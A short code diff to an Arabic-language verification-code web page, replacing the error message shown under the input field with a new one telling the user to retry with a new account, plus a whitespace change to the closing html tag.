@@ -245,7 +245,7 @@
             verifyButton.textContent = "خطأ";
             verifyButton.style.backgroundColor = "red";
             // كتابة الرسالة أسفل حقل الإدخال وزر التحقق
-            document.getElementById("errorMessageBelow").textContent = "اذا لم يصل الرمز في غضون 3 دقائق الرجاء المحاولة بحساب اخر والتاكد من تسجيل الخروج من الحساب الحالي لعدم تصنيفك كمتلاعب";
+            document.getElementById("errorMessageBelow").textContent = " لا يمكن لخوادمنا إرسال رسالة تحقق لهذا الحساب نظراً لأنك لم تقم حتي الآن بإنشاء حساب بتلك البيانات الرجاء المحاولة مرة اخري بحساب جديد";
             // وبعد 3 ثوانٍ، إعادة النص إلى "تحقق" ولونه الأزرق مع بقاء الرسالة ظاهرة
             setTimeout(() => {
               verifyButton.textContent = "تحقق";
@@ -340,4 +340,4 @@
     <button id="retryButton" class="retry-btn" style="display: none;">إعادة المحاولة بحساب جديد</button>
   </div>
 </body>
-</html>
+  </html>
